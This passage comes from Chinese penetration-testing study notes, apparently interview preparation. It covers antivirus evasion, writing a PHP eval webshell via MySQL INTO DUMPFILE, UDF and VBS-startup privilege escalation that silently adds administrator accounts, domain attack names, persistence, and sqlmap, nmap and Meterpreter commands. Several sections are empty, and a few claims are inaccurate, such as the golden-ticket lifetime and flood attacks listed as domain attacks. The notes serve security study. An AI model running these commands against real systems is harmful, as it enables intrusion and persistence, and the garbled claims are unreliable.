php测试语句:<?php phpinfo();?> 禁用的函数：passthru,exec,system,putenv,chroot,chgrp,chown,shell_exec,popen,proc_open,pcntl_exec,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,imap_open,apache_setenv

# 蚁剑绕过 disable_functions 插件
```

### 00x02 Windows Defender 防御机制及绕过

```shell
# Windows Defender 防病毒，通过实时监控和扫描计算机系统来保护系统免受恶意软件的攻击。其防御机制主要基于以下原理：
	1- 文件监控：会监控计算机的文件系统，并对所有试图修改文件的行为进行检测和阻止，防止恶意软件对系统进行修改和破坏
	2- 邮件监控：可监控电子邮件系统，并对所有来自未知发件人或包含可疑附件的邮件进行检测和拦截，以防止病毒通过电子邮件进行传播
	3- 网络监控：会监控计算机的网络连接，并对所有未经授权的网络流量进行检测和阻止，以防止恶意软件通过网络进行传播和攻击
	4- 行为监控：可监控计算机的行为，并对所有可疑的行为进行检测和阻止，如自动安装软件、修改系统设置等，防止恶意软件对系统进行攻击
# 绕过方法：
	1- 利用漏洞：可利用 Windows Defender 的漏洞或弱点绕过其防御机制，漏洞可能存在于软件本身或与其相关的组件中
	2- 修改配置：可通过修改 Windows Defender 的配置文件禁用或绕过其防御机制，可修改 Windows 注册表中的相关设置或直接编辑 Windows Defender 的配置文件禁用或绕过其防御机制
	3- 绕过文件检查：可通过修改文件的特征或属性绕过 Windows Defender 的文件监控功能，可修改文件的数字签名或元数据使其像可信程序，从而绕过 Windows Defender 的文件监控
	4- 加密绕过：可使用加密技术绕过 Windows Defender 的防御机制。可通过加密恶意软件或将其伪装成受信任文件或程序绕过 Windows Defender 的检测和拦截
# 需注意，这些方法都需攻击者具备一定技术能力和知识，只有专业黑客或组织才可能成功绕过 Windows Defender 的防御机制。这些方法也可能会对计算机系统造成严重的损害和安全风险，不建议普通用户尝试这些方法

# Windows Defender 微软 Windows 操作系统内置防病毒和反恶意软件解决方案，采用多层次的防御机制保护系统免受恶意软件和威胁的侵害
	1- 实时保护：通过实时监控系统文件、网络连接和进程等活动及定期病毒定义更新，检测和阻止已知恶意软件，可及时扫描、监控并拦截潜在的恶意行为
	2- 云端保护：与云端安全服务相结合，基于全球性的恶意软件数据库和机器学习算法及时检测和分析新出现的威胁，并提供及时的保护。云端保护使其能够快速应对新的恶意软件变种和未知威胁
	3- 行为监测：通过监控应用程序和系统行为检测可疑活动模式。可检测到文件的意外修改、注册表的异常操作或可疑的网络活动识别和拦截潜在的恶意软件
	4- 网络防火墙：Windows Defender 包含一个网络防火墙可监控网络连接和流量，识别并阻止恶意软件尝试通过网络进行攻击或传播
# 绕过方式：
	1- 利用漏洞：恶意软件可能通过利用操作系统或应用程序的漏洞绕过 Windows Defender 的防御机制（及时安装操作系统和应用程序的安全补丁）
	2- 巨献驱动程序：恶意软件可能会使用巨献驱动程序规避 Windows Defender 监控和检测。加载驱动程序可对系统进行深层修改，隐藏自己的存在。定期更新 Windows Defender 的病毒定义可增加检测新威胁的几率
	3- 加密和激活：有些恶意软件使用加密算法或动态加载技术以避免被 Windows Defender 检测到。可使恶意软件代码在执行过程中解密或动态加载从而规避静态分析
# 虽存在可能的绕过方式，但要成功规避 Windows Defender 的防御是非常困难的，特别是对于最新版本的 Windows Defender 而言。遵循良好的安全实践，如定期更新操作系统和应用程序、审查可疑邮件和下载、限制管理员权限、配置合适的防火墙和安全策略等，是保护系统安全的重要举措
```

### 00x03 卡巴斯基进程保护绕过及进程迁移

```shell
要绕过卡巴斯基的进程保护进行进程迁移，可以尝试以下方法：
关闭杀毒软件：首先，可以尝试关闭卡巴斯基的杀毒软件，以便能够迁移进程。但是，这种方法可能会导致系统面临安全风险，因此请确保在关闭杀毒软件之前备份重要数据并确保系统的安全性。
使用免杀技术：免杀技术是一种使恶意软件在运行时不被检测到的方法。通过使用免杀技术，可以降低卡巴斯基对特定进程的检测和保护。但是，请注意，使用免杀技术可能会使您的系统面临潜在的安全风险。
利用系统漏洞：某些系统漏洞可以让攻击者绕过杀毒软件的保护。因此，了解并利用这些漏洞可以使得进程迁移变得更加容易。但是，这种方法可能会导致系统崩溃或数据损失，因此请谨慎使用。
使用虚拟化技术：虚拟化技术可以创建虚拟机，这些虚拟机与主机系统隔离，因此可以在虚拟机中运行可疑的进程，而不会受到卡巴斯基的检测和保护。但是，这种方法需要一定的技术知识和资源，并且可能会降低系统的性能。
总之，为了确保系统的安全性，请尽可能避免绕过杀毒软件的保护。如果必须进行进程迁移，请使用合法和安全的方法，并确保在操作之前备份重要数据。
```

### 00x04 天擎终端防护绕过

```shell

```

### 00x05 绕过提取内存 HASH 查杀

```shell
# 提取内存 hash 被查杀，可以采取以下方法进行绕过：
修改本地 hash：攻击者获取所有本地 hash，包括 administrator 账号。该过程会得到本地和域用户的 hash 列表。可修改本地 hash 使其不被攻击者识别
修改注册表：修改注册表，可禁止相关服务程序运行从而避免被查杀
利用系统漏洞：利用系统漏洞可在内存中执行任意指令，从而绕过查杀机制
使用免杀技术：使用免杀技术，可修改 shellcode 特征码，使其无法被杀毒软件识别和清除
# 需注意，以上方法都存在一定风险，可能会导致系统不稳定或不安全。建议在使用这些方法前备份重要的数据，确保了解这些方法的具体操作和可能的风险
```

## 0x00x034 MySQL 写 shell

```shell
# 写 shell 必要条件
	1- 必须 root 权限
	2- 知道网站绝对路径
	3- my.ini 配置文件中 secure_file_priv 函数配置必须为空
# 写 shell
	select '一句话' into outfile '路径';
	select '一句话' into dumpfile '路径';
	select '<?php eval($_POST[1]) ?>' into dumpfile '路劲.muma.php';
```

## 0x00x035 域渗透

```shell
1- 制作白银票据
2- 制作黄金票据

二者区别：黄金票据只有30分钟，白银票据是永久

# 域内攻击手法
	1- MS14-068
	2- Roasting 攻击离线爆破密码
	3- 委派攻击
	4- 非约束性委派
	5- 基于资源的约束委派
	6- ntlm relay；
```

## 0x00x036 Win/Linux 提权

```shell
# Win 提权
	1- 内核提权 systeminfo 寻找对应 EXP 利用 Windows 系统内核溢出漏洞进行提权
	2- whoami /all 查看用户权限
	3- 数据库提权：通过数据库配置错误或漏洞来提升权限。
	4- 系统配置错误提权：利用系统配置文件的错误配置或漏洞来提升权限。
	5- 组策略首选项提权：通过修改组策略首选项来实现提权。
	6- Bypass UAC提权：通过绕过用户账户控制（UAC）来提权。
	7- 令牌窃取提权：通过窃取合法用户的令牌来获取权限。
	8- 远程桌面提权：通过在远程桌面会话中执行恶意代码来提权。
# Linux 提权
	1- 脏牛提权
		脏牛提权的了解
	2- sodu 提权
	3- 内核提权
```

## 0x00x037 数据库提权

```shell
# MySQL
	1- MOF 提权
	2- UDF 提权
	3- VBS 启动项提权
# SQLServer
	1- xp_cmdshell 扩展存储函数提权
	2- 差异备份提权
# Access
```

## 0x00x038 MySQL UDF 提权常用命令

```shell
create function cmdshell returns string soname 'udf.dll';
select cmdshell('net user liuyazhuang lyz123 /add');
select cmdshell('net localgroup administrators liuyazhuang /add');
select cmdshell('net localgroup administrators');
select cmdshell('ipconfig/all');
select cmdshell('net user');
select cmdshell('regedit /s d:\wwwroot\3389.reg');
drop function cmdshell;
select cmdshell('netstat -an');
```

## 0x00x039 MySQL VBS 启动项提权

```shell
# 原理概述
WebShell 连接数据库，建立表 a 将 VBS 脚本写入表中，然后导入启动项；该脚本仅对中文版 OS 系统有效，使用其他语言版本仅需对 "C:\\Documents and Settings\\All Users\\[开始]菜单\\程序\\启动\\a.vbs" 脚本进行相应更改。在 VBS 脚本后面有一个"0"，表示不弹出 CMD 窗口，以静默模式运行。该方法是在通过UDF 提权失败情况下，将 VBS 插入启动项中，待系统重启后将自动添加一个用户，
# 执行语句
create table a (cmd text); # 创建一个 a 表 cmd 字段 text 是字段类型
insert into a values("set wshshell=createobject(""wscript.shell"") " ); # 在 a 表插入一个 vbsshell 语句
insert into a values("a=wshshell.run(""cmd.exe /c net user xxoo 123123 /add"",0) " ); # 用 VBSshell 执行一个添加用户的操作
insert into a values("b=wshshell.run(""cmd.exe /c net localgroup administrators xxoo /add"",0) " ); # 用 VBSshell 执行将 xxoo 用户添加到管理员组
select * from a into outfile "C:\\Documents and Settings\\All Users\\[开始]菜单\\程序\\启动\\a.vbs"; # 将 a 表内容插或写入到启动项目录下，且保存文件名为 a.vbs
```

## 0x00x040 Linux 下 MySQL 提权

```shell
mysql -hlocalhost -uroot -p
system useradd hacker
system passwd hacker
system tail -l /etc/passwd
system tail -l /etc/shadow
```

## 提权 附加

### 00x00 提权为何选择不带空格目录

```shell
# 提权时选择可读写目录，为何尽量不用带空格目录
	1- exp 执行多半需空格界定参数
```

### 00x01 TrustedInstaller 权限及原理

```shell
# TrustedInstaller 是 Windows 操作系统中的一个特殊权限，用于防止程序或用户无意或恶意破坏系统文件。是一种高级权限，只有系统管理员能用其管理和维护操作系统
TrustedInstaller 权限原理：
授予系统级别的访问和修改文件的能力，只有拥有该令牌的系统进程才能更改系统重要内容，而其他大部分系统服务就没有权限
以管理员身份运行的程序可任意更改系统，降低系统安全性。而 TrustedInstaller 则改变这一情况，使得只有拥有该令牌的系统进程才能更改系统重要内容，从而保护操作系统的核心文件和系统组件，确保其完整性和安全性
```

### 00x02 烂土豆 (Juicypotato) 提权原理及利用

```shell
# 提权原理 MS16-075
	在计算机系统中,通过利用存在漏洞的软件或系统来获取管理员权限或者高权限用户的行为
攻击者可诱骗用户尝试使用 NTLM 对其计算机进行身份验证，则可将该身份验证尝试中继到另一台计算机
Microsoft 通过使用已进行的质询禁止同协议 NTLM 身份验证对此进行修补。这意味着从一个主机回到自身的 SMB -> SMB NTLM 中继将不再起作用，但跨协议攻击（如 HTTP -> SMB）仍可正常使用

```

### 00x03 越权类型及判断

```shell
- 类型：水平越权、垂直越权；
- 如何判断：修改参数值，id 为0 或1，admin 为true 或false 等；
```

## 代理 附加

### 00x00 如何分析代理数据流

```shell
# 如何分析被代理出来的数据流
```



## 内存马 附加

### 00x00 [分析内存马](https://www.cnblogs.com/lcxblogs/articles/15238924.html)

```shell
判断内存马注入方式，查看 web 日志；
filter 或 listener 类型：会有大量 url 请求路径相同参数不同，或页面不存在但返回 200；
哥斯拉、冰蝎类型：相同 url 请求，内存马注入流量特征与普通 webshell 流量特征基本吻合；
通过查找返回 200 的 url 路径对比 web 目录下是否真实存在文件，不存在大概率为内存马；

# 排查中间件漏洞是否导致代码执行注入内存马
error.log 日志
注入时间和方法，业务使用的组件是否可能存在 代码执行漏洞

是否存在 webshell，排查框架漏洞，反序列化漏洞
```

## 内网 附加

### 00x00 [内网穿透](https://www.cnblogs.com/Xy--1/p/13475299.html)

```shell
# 将内网外网通过隧道打通,让内网的数据外网可获取
```

[内网穿透从搭建到溯源](https://blog.csdn.net/u012206617/article/details/114012822)

[内网穿透之流量代理转发](https://www.cnblogs.com/Xy--1/p/13475299.html)

### 00x01 内网渗透思路

```shell
1- 确定目标：明确渗透的目标，例如特定IP地址、子网或主机。
2- 信息收集：通过各种手段收集与目标相关的信息，包括主机IP地址、开放的端口和运行的服务等。可以使用的工具包括Nmap、Ping扫描、Whois查询等。
3- 漏洞扫描：根据收集到的信息，利用各种漏洞扫描工具扫描目标，寻找已知的漏洞或弱点。
4- 获取访问权限：利用找到的漏洞或弱点，尝试获取对目标系统的访问权限。这可能需要利用一些攻击技术，如缓冲区溢出攻击、SQL注入、XSS等。
5- 内网渗透：一旦获得目标系统的访问权限，便可以开始内网渗透。这可能包括渗透其他系统、获取敏感信息、安装后门等。
6- 日志清理：在进行内网渗透过程中，需要做好日志清理工作，以避免留下痕迹被发现。
```

### 00x02 内网渗透降权的作用

```shell
# 提升安全性，暴露风险和提升安全水平
1- 提升安全性：通过降权，可以减少系统的功能，降低潜在的攻击面，从而增强系统的安全性。
2- 暴露风险：降权可以帮助发现和暴露系统中的潜在风险。例如，通过降权，可以发现是否存在未经授权的用户访问或操作，或者是否存在某些功能的异常行为。
3- 提升安全水平：通过降权，可减少系统管理员的权限，从而减少系统被攻击的可能性。如果系统管理员的权限过大，一旦其账号被攻击整个系统都可能被攻击。但如果系统管理员的权限较小，即使其账号被攻击，也只会影响较小的范围，不会对整个系统造成太大的影响。
```

### 00x03 域内委派及利用

```shell
域内委派是一种机制，可以将域内用户的权限委派给服务账号。通过域内委派，服务账号能够以用户的权限在域内展开活动。这是解决一些场景问题的有效方式，例如域内文件服务器需要实现每个人不同的权限，或者IIS需要模拟用户访问后端的其他服务器以获取相应的资源。
要实现域内委派，需要满足以下条件：被委派的用户不能被设置为不能被委派。域内委派可以通过设置委派属性来实现，对于Windows系统，可以在“组策略”的“计算机配置”中设置“委派用户对象所有权”。
需要注意的是，域内委派并不是所有场景下的最佳选择。在使用时，应根据具体业务需求和安全要求来决定是否使用域内委派，并充分考虑其潜在风险和副作用。
```

### 00x04 Jsonp 与 Cors 跨域原理

```shell
# Jsonp（JSON with Padding）原理：
	1- 通过在网页中动态插入一个script标签，利用script标签的src属性没有同源限制的机制
	2- 发送GET请求获取数据，并将返回的数据镶嵌到JavaScript函数中，当脚本被执行时，函数被调用，从而获取数据
	3- 只支持GET请求，不支持POST等其他类型的请求，也不支持复杂请求
# Cors（Cross-Origin Resource Sharing）原理：
	1- 通过在服务器端设置响应头信息，添加Access-Control-Allow-Origin字段，来告诉浏览器可以进行跨域访问
	2- 浏览器在发送跨域请求时会在预检请求中包含自己Origin信息。若服务器支持Cors就在响应头中添加Access-Control-Allow-Origin，从而允许浏览器跨域请求
	3- 支持多种类型的请求，包括GET、POST等，也支持复杂请求
	4- 需要服务器端支持Cors配置（前端不需要进行任何的配置）
# 总之，Jsonp和Cors都可以解决跨域问题。Jsonp更为简单，适用于较简单的请求；而Cors更为强大，适用于复杂的请求。在实际使用中，应根据需求选择合适的方案
```

### 00x05 如何利用域内普通用户(非域用户)

```shell
# 域内的普通用户（非域用户）可以利用某些网络协议和工具，例如SMB和远程桌面协议（RDP），来进行网络管理和访问。这些协议和工具可以提供对共享文件和设备的访问，以及远程管理和维护。
具体来说，可使用以下步骤进行利用：
	1- 找到可用的网络共享文件夹：使用SMB协议扫描网络，找到可用的共享文件夹。
	2- 尝试使用默认凭据：对于某些共享文件夹，可以尝试使用默认的用户名和密码进行访问。
	3- 利用弱密码和简单密码：尝试使用弱密码和简单密码进行身份验证。这些密码容易被猜测或破解。
	4- 利用开放的远程桌面协议：如果远程桌面协议（RDP）被启用并且没有强密码保护，可以尝试使用默认的用户名和密码进行访问。
	5- 利用已知的漏洞：某些网络协议和工具可能存在已知的漏洞。可以搜索并利用这些漏洞来获取访问权限。
# 需要注意的是，这些步骤可能会违反网络安全规定和法律法规，因此应该仅在合法授权的情况下进行。同时，为了保护网络安全，应该及时更新系统和软件补丁，并设置强密码和启用两步验证等安全措施。
```

### 00x06 工作组环境下如何渗透

```shell
# 在工作组环境下进行渗透是一项复杂且需要谨慎的任务，以下是一般的渗透思路和步骤：
	1- 信息收集：首先，收集尽可能多的关于目标工作组的信息。这可能包括工作组的成员、他们的角色和职责、使用的网络和服务器等。可以通过社交媒体、公共记录和其他在线资源来获取这些信息。
	2- 识别潜在漏洞：寻找可能存在的漏洞。这可能包括软件、操作系统、网络协议或配置错误等。利用搜索引擎、安全扫描工具或渗透测试工具来寻找这些漏洞。
	3- 确定攻击路径：选择最有可能成功的攻击路径。这可能包括利用已知的漏洞、利用社会工程学技巧（例如钓鱼攻击）或利用弱密码等。
	4- 实施渗透：利用找到的漏洞或攻击路径尝试渗透工作组。这可能包括获取对工作组计算机或网络的访问权限，或窃取敏感数据。在进行渗透时，要尽可能保持低调，避免引起注意。
	5- 维持访问权限：一旦成功渗透，要确保能够保持访问权限。这可能需要安装持久性后门，或者隐藏自己的活动痕迹。
	6- 隐蔽行动：在渗透完成后，要尽可能隐蔽行动，避免留下明显的痕迹。这可能需要清除日志记录、修改时间戳或使用隐身模式等。
	7- 数据收集和分析：收集尽可能多的数据，并进行分析，以找出潜在的下一个目标或攻击路径。这可能包括敏感文件、电子邮件、聊天记录等。
# 需要注意的是，渗透是一项高风险的活动，可能会违反法律法规和道德规范。在进行渗透之前，应该确保自己拥有足够的技能和知识，并且得到合法授权。
```

### 00x07 域内攻击方法

```shell
# 域内攻击指的是在同一个域内，攻击者利用各种手段对目标进行的攻击行为。以下是一些常见的域内攻击方法：
SYN洪水攻击：通过发送大量的虚假连接请求，导致目标端口拒绝服务，无法处理正常的连接请求。
ICMP响应（ping）攻击：通过发送大量的虚假ping请求，导致目标主机无法处理正常的ping请求。
SMURF攻击：通过向广播地址发送虚假的ping请求，使得目标主机的所有邻居都回复一个多倍的回复，导致目标主机崩溃。
UDP洪水攻击：通过向目标主机的UDP端口发送大量的无效数据包，导致目标主机无法处理正常的UDP连接。
SYN洪水攻击：通过规律性地发送虚假的TCP连接请求，使得目标主机不断地增加TCP连接表的大小，最终导致目标主机崩溃。
远程文件包含（Remote File Include，RFI）攻击：通过在URL中包含恶意文件路径，使得目标网站加载并执行恶意文件，从而获得对目标网站的访问权限。
SQL注入攻击：通过在输入框中输入特殊的SQL语句，使得目标数据库执行非法的操作，从而获得对数据库的访问权限。
命令注入攻击：通过在输入框中输入特殊的命令，使得目标服务器执行非法的操作，从而获得对服务器的访问权限。
会话劫持（Session Hijack）攻击：通过窃取合法用户的会话信息，从而获得对目标系统的访问权限。
会话固定（Session Fixation）攻击：通过利用目标网站的一个漏洞，使得目标网站将用户的会话信息固定在一个特定的会话上，从而获得对目标系统的访问权限。
这些攻击方法都会对目标系统造成不同程度的影响，甚至可能导致目标系统崩溃或数据泄露等严重后果。因此，我们应该采取有效的措施来防范这些攻击。
```

### 00x08 横向渗透命令执行手段

```shell
1- psexec：会记录大量日志；
2- wmic：不会记录日志，更为隐蔽；
3- smbexec
4- net use 共享 + 计划任务 + type 命令；
```

[内网渗透之端口转发与代理工具总结](https://www.freebuf.com/articles/web/170970.html)

## 免杀 附加

### 00x00 免杀原理

```

```

### 00x00 内存马机制

```shell
# 内存马（Memory Malware）是一种恶意软件，其机制是将恶意代码注入到系统的内存中并执行。内存马通过操作系统或应用程序的漏洞或弱点注入恶意代码，使其免受传统防御机制的检测和阻止
以下是内存马的一般机制：
1. 渗透：利用系统或应用程序的漏洞通过网络攻击或社会工程学手段将自身注入到目标机器的内存中，常见的攻击方式包括漏洞利用、恶意邮件附件、恶意下载等
2. 注入：一旦系统被入侵内存马会将恶意代码注入到受感染进程的内存空间中。可通过如代码注入、API hooking、DLL 注入等技术实现。注入的恶意代码通常会被伪装成合法进程或模块，以躲避安全检测
3. 执行和隐藏：注入的恶意代码开始在目标系统的内存中执行。内存马通常包括木马（Trojan）功能，可从控制服务器获取指令、窃取敏感信息、进行远程命令执行等活动。为绕过安全监测，内存马会采取措施隐藏其存在，如修改进程结构、混淆代码、修改主机文件等
4. 横向移动：一旦内存马成功注入并执行，可利用系统的网络功能和权限尝试在网络中横向移动。可扫描网络并寻找其他易受攻击的主机，以便进一步传播和扩大影响范围
5. 持久化：为保持长期存在，内存马通常会采取措施来实现持久化。包括创建自启动项、修改注册表、劫持系统服务等。通过持久化内存马可在系统重新启动后再次注入和执行
# 内存马的机制可能因具体的恶意软件而有所不同，上述仅是一般情况的概述。为有效应对内存马的威胁，建议及时更新操作系统和应用程序的补丁，使用安全防护软件，限制不必要的网络访问权限，并加强对恶意文件和链接的警惕

# 内存马是一种利用操作系统的内存管理漏洞，将恶意代码注入到目标系统的内存中，从而实现对目标系统的控制和攻击
内存马的机制主要包括以下几个步骤：
	1- 检测目标系统：内存马首先需检测目标系统的操作系统和硬件配置，以确定其是否适合运行恶意代码
	2- 植入恶意代码：确定目标系统可运行恶意代码，内存马就会尝试将恶意代码植入到目标系统的内存中。通过利用漏洞或社会工程学攻击手段实现
	3- 执行恶意代码：成功将恶意代码植入到目标系统的内存中，内存马就会开始执行恶意代码。包括窃取信息、攻击其他系统、控制目标系统等
# 内存马的攻击过程通常利用操作系统的内存管理机制中的漏洞，如缓冲区溢出、指针滥用等。攻击者通过精心设计的攻击代码，能够在目标系统的内存中执行恶意代码，从而实现对目标系统的控制和攻击
# 为防止内存马的攻击可采取一些安全措施，如关闭不必要的网络服务、修补系统漏洞、使用安全软件等。同时对用户进行安全教育和培训，提高安全意识也是防止内存马攻击的重要措施
```

### 00x01 免杀木马思路

```shell
# 免杀木马是指通过各种技术手段绕过杀软或安全防护软件的检测与拦截，使木马能够成功潜入目标系统。尽管我无法提供具体的实施方法或鼓励不当行为，但我可以向您介绍一些可能用于免杀木马的一般思路，以增加对此类攻击的认识。
1. 多种变形：利用代码混淆、加密、压缩等技术手段，改变木马代码结构和内容使其难被静态或动态分析工具检测到。通过不断调整和变化以逃避杀软签名检测和行为识别
2. 加载器和解密器：使用加载器和解密器技术将木马功能划分为多个模块，并只在运行时进行解密和加载。能够向杀软隐藏木马真正的功能代码从而绕过静态检测
3. 零日漏洞利用：寻找并利用目标系统中尚未被报告或修补的未知漏洞，在系统中注入木马代码并绕过杀软检测。需高级的洞研究和利用技术并具有一定法律、道德和伦理风险
4. 文件格式漏洞：利用常见软件或系统的文件格式漏洞，如Office文档漏洞、PDF漏洞等，向目标系统注入木马代码。通过精心构造的文件格式以迷惑用户和安全软件，从而实现免杀效果
5. 宿主进程注入：将木马代码注入合法进程中运行，使其在进程间通信的过程中不易被杀软检测。通过借用合法进程的权限和信任，保持低调并保持对系统的持续监控和控制
# 请注意，免杀木马是一种违法行为，可能会对个人隐私、企业安全和社会秩序造成严重威胁。随着安全防护技术的不断发展，杀软厂商也在不断更新检测机制来应对免杀攻击。建议个人和组织加强安全意识、采取综合的防御措施，并合法合规地保护系统和数据的安全

# 木马的思路主要是通过修改木马的特征信息，使其在杀毒软件的检测中无法被识别为恶意软件，从而达到免杀的效果。具体来说，免杀木马的技术包括：
	1- 修改文件特征码：将木马文件中的特征码替换为其他文件中的特征码，以避免被杀毒软件检测到
	2- 加密/解密技术：使用加密/解密技术对木马文件进行加密或解密，以避免被杀毒软件检测到
	3- 更换壳：将木马文件更换一层新的“壳”，以避免被杀毒软件检测到
	4- 内存特征码修改：在内存中修改木马程序的特征码，以避免被杀毒软件检测到
	5- 花指令：在木马程序中添加一些无用的代码，以干扰杀毒软件的检测
# 使用免杀木马可能会带来安全风险，建议用户不要使用
```

### 00x02 免杀绕过火绒及 360 添加 Win 用户

```shell

```

### 00x03 ShellCode 免杀

```shell
# ShellCode
一段用于利用软件漏洞而执行的代码，因常让攻击者获得 shell 而得名；其通常被编码为 16 进制的机器码，可在暂存器 EIP 溢出后；塞入一段可让 CPU 执行 ShellCode机器码，让电脑可执行攻击者的任意指令

Go 免杀
```

### 00x04 制作 Powershell 免杀

```

```

### 00x05 shellcode 嵌入正常 exe

```shell
1- 获取 ShellCode：获取要嵌入 ShellCode，可从网络上下载的恶意软件或自行编写代码
2- 打开目标EXE文件：使用二进制编辑器（如 Hex Editor）打开目标 EXE 文件
3- 插入Shellcode：在 EXE 文件的适当位置插入 ShellCode，可选择在文件头部、尾部或任何可用的空间插入 ShellCode
4- 修改EXE文件头：根据 Shellcode 放置位置，修改 EXE 文件头部。如将 ShellCode 放在 EXE 文件头部，需修改文件头的某些字段，确保 ShellCode 能正确执行
5- 保存EXE文件：保存修改后的 EXE 文件
```

## 权限维持 附加

### 00x00 Linux / Windows 权限维持

```shell
# 在Linux系统中，权限维持主要通过以下方法：
	1- 利用useradd命令：可创建新的用户账户，并设置用户密码、家目录等属性。通过useradd命令添加的用户默认是没有任何权限的，需要使用chmod命令修改文件权限
	2- 利用直接对/etc/passwd文件进行写入：可以修改用户信息，包括用户ID、家目录等。但是这种方法需要具有root权限，并且修改后需要重新启动系统才能生效
	3- 利用启动项和计划任务：可以设置系统启动时自动运行的程序，或者按照一定时间间隔自动运行的程序。通过这些程序，可以维持用户权限
# 在Windows系统中，权限维持主要通过以下方法：
	1- 利用注册表克隆Administrators用户：可创建一个与Administrators用户具有相同权限的新账户。但这种方法只能在本地机器上进行，并且需要具有管理员权限
	2- 利用直接对SAM文件进行写入：可以破解用户密码，从而获得用户权限。但是这种方法需要具有管理员权限，并且可能会破坏系统文件
	3- 利用Metasploit自带工具：可以攻击系统漏洞，从而获得用户权限。但是这种方法需要具有较高的技术水平，并且可能会破坏系统文件
# 需要注意的是，以上方法都需要具有管理员权限或者更高的权限，并且可能会破坏系统文件或者导致系统崩溃。因此，建议在合法授权的情况下进行操作。
```

[渗透中的权限维持](https://blog.csdn.net/anquanzushiye/article/details/105502079)



## 0x00x041 SQLMap

```shell
1- SQLmap 注入工具
# 关键函数
	--is-dba 								# 当前用户权限（是否为 root 权限，mssql 下最高权限为 sa）
	--dbs									# 所有数据库
	--current-db							# 网站当前数据库
	--users 								# 所有数据库用户
	--current-user 							# 当前数据库用户
	--random-agent 							# 构造随机 User-Agent
	--passwords 							# 数据库密码
	--proxy http://local:8080 –threads 10   	# (可以自定义线程加速) 代理
	--time-sec=TIMESEC DBMS					# 响应的延迟时间（默认为5秒
	--threads=                       			# 使用多少线程
	--batch									# 自动化选择
# Cookie 注入
	sqlmap.py -u "http://www.xxx.com?id=1注入点" --cookie="cookie 值" --current-db
# POST 注入
	sqlmap -r "数据包地址" -p "需要制定的参数" –dbms 需要制定的数据类型
# GET 注入
	sqomap -u “注入点地址” --dbs 跟上你需要的参数
# 交互式写 shell
	1- 前提条件：最高权限、web 网站绝对路径、能获取 cookie
	2- sqlmap.py -u "注入点地址" --cookie="cookie值" --os-shell
		2.1- echo "一句话木马"网站绝对路径
	3- 输入 web 网站的绝对路径
	4- 传木马
```

## 0x00x042 Nmap

```shell
# Nmap 网络扫描和主机检测的工具
# 常用的参数
	nmap www.baidu.com　　  			  			# 扫描单一主机
	nmap 192.168.1.154 　　　			　		# 扫描单一主机
	nmap 192.168.1.1/24　　			 　		# 扫描整个子网
	nmap 192.168.1.154 192.168.1.156    		# 扫描多个目标
	nmap 192.168.1.1-100 　　　　   	  		# 扫描 IP 地址为 192.168.1.1-192.168.1.100 内所有主机
	nmap -iL target.txt　　　　			  		# 扫描批量 IP 地址
	nmap 192.168.1.1/24 -exclude 192.168.1.1 	 # 扫描除过某一个 IP 外所有子网主机
	nmap 192.168.1.1/24 -exclude file xxx.txt  	 # xxx.txt 中的文件将会从扫描的主机中排除
	nmap -p80,21,23 192.168.1.154　　				# 扫描特定主机上 80、21、23 端口
	nmap -sS 192.168.1.1						 # 半开放扫描
	namap --script==vuln						 # 扫漏洞，比较重的一个
	namp -oN									# 保存扫描结果
# 基本这些就够用了，如果有大佬觉得还有更好的使用方式欢迎补充啊，跪谢
```

## 0x00x043 MSF

```shell
# 常用命令
	background 										# 让meterpreter 处于后台模式
	sessions -i number 								# 与会话进行交互，number 表示第 n 个session
	quit 											# 退出会话
	shell 											# 获得命令行
	cat c:\\boot.ini 								# 查看文件内容
	getwd 											# 查看当前工作目录 work directory
	upload /root/Desktop/netcat.exe c:\\ 			# 上传文件到目标机上
	download 0xfa.txt /root/Desktop/ 				# 下载文件到本机上
	edit c:\\boot.ini 								# 编辑文件
	search -d d:\\www -f web.config 				# search 文件
	ps 												# 查看当前活跃进程
	migrate pid 									# 将 Meterpreter 会话移植到进程数 w 为 pid 进程中
	execute -H -i -f cmd.exe 						# 创建新进程 cmd.exe，-H 不可见，-i 交互
	getpid 											# 获取当前进程 pid
	kill pid 										# 杀死进程
	getuid 											# 查看权限
	sysinfo 										# 查看目标机系统信息，如机器名，操作系统等
	getsystem 										# 提权操作
	timestompc:/a.doc -c "10/27/2015 14:22:11" 			# 修改文件的创建时间
# 迁移进程
	1- meterpreter > ps
	2- 自行选择 PID
	3- meterpreter > migrate pid

# 还可以做免杀木马等等。。。。MSF 蛮强大的
```

## 0x00x044 冰蝎

```shell
# webshell 管理工具；
# 流量特征：
  1- Accept: application/json, text/javascript;
  2- Content-type: Application/x-www-form-urlencoded
  3- eval($port);
```

## 0x00x045 蚁剑

```shell
# 流量特征：_0x、@ini_set
```

## 0x00x046 蚁剑/菜刀/C 刀/冰蝎的相同与不相同之处

## 逆向 附加

### 00x00 Android APP 逆向分析步骤

```shell
1. 获取 APK 文件：获取目标 APP 的 APK 文件。可通过从 Google Play 下载、从第三方应用市场下载，或从设备上提取已安装应用程序完成
2. 解压 APK 文件：将 APK 文件解压缩为文件夹，可使用常见解压工具如 WinRAR 或 7-Zip 完成。解压后将看到资源文件和代码文件
3. 反编译：对于 Java 代码可使用工具如 apktool、dex2jar 或 jadx 等进行反编译，将 APK 中 Dalvik 字节码转换为 Java 源代码，可查看和理解应用程序的逻辑
4. 分析代码：根据反编译 Java 源代码，分析应用程序的逻辑和结构。特别关注与感兴趣的功能相关的类和方法
5. 调试：使用调试工具如 Android Studio 内置调试器连接设备或模拟器，对应用程序进行调试，可在运行时观察代码执行过程、变量的值及函数的调用顺序
6. 动态分析：使用工具如 Frida、Xposed 等进行动态分析。通过这些工具可在运行时查看和修改应用程序的行为，在不修改 APK 文件情况下改变应用程序的行为和功能
7. 数据溯源：通过调试或动态分析跟踪应用程序使用的数据来源，观察网络请求、文件读写操作或与其他应用程序的交互等，以了解应用程序的数据流动和存储方式
8. 逆向验证：在逆向分析过程中，对所得结果进行验证和测试，尝试修改代码以验证理解是否正确，同时确保逆向分析过程符合道德和法律要求
```

### 00x01 ARM 32 位指令中返回值和返回地址保存位置

```shell
# ARM 32 位指令中，返回值和返回地址保存在哪个寄存器中
